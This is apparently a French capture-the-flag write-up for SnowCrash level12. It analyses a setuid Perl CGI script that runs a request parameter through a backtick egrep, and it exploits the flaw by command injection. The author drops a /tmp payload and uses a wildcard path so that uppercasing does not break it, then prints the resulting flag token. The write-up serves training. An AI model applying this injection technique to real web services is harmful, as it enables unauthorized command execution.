
```
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```
Que contient donc `level12.pl` ?
```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

Encore un serveur web, comme dans le level11, un coup d'oeil à la doc de perl et on comprend qu'il s'agit du meme type de faille, le paramètre `x` étant utilisé après traitement comme paramètre d'un egrep.
```perl
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; # toupper(x)
  $xx =~ s/\s.*//; # on supprime tout ce qu'il y a après les espaces
  @output = `egrep "^$xx" /tmp/xd 2>&1`; # on s'en sert pour avec l'egrep du système
```
Une injection de commande semble donc la voie la plus évidente, petite difficulté dans le traitement du paramètre x de l'URL, il est mis en majuscule et tout ce qui suit le premier espace est éliminé...

Dans un premier temps on va créer la payload, avec un nom en majuscule pour contourner le script:
```
level12@SnowCrash:~$ echo 'getflag > /tmp/flag' > /tmp/WTF
level12@SnowCrash:~$ chmod +x /tmp/WTF
level12@SnowCrash:~$ ls -l /tmp/WTF
-rwxrwxr-x 1 level12 level12 20 May  1 11:36 /tmp/WTF
```
Il nous reste à l'injecter:
```
level12@SnowCrash:~$ curl '127.0.0.1:4646?x=`/tmp/wtf`'   
..level12@SnowCrash:~$ cat /tmp/flag
cat: /tmp/flag: No such file or directory
```
Il ne trouve pas notre fichier... normal, `/TMP` n'est pas un dossier valide ! On va donc utiliser une wildcard:
```
level12@SnowCrash:~$ curl '127.0.0.1:4646?x=`/*/wtf`'  
level12@SnowCrash:~$ cat /tmp/flag                   `'
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
On a le flag, `g1qKMiRpXf53AWhDaU7FEkczr` :tada:
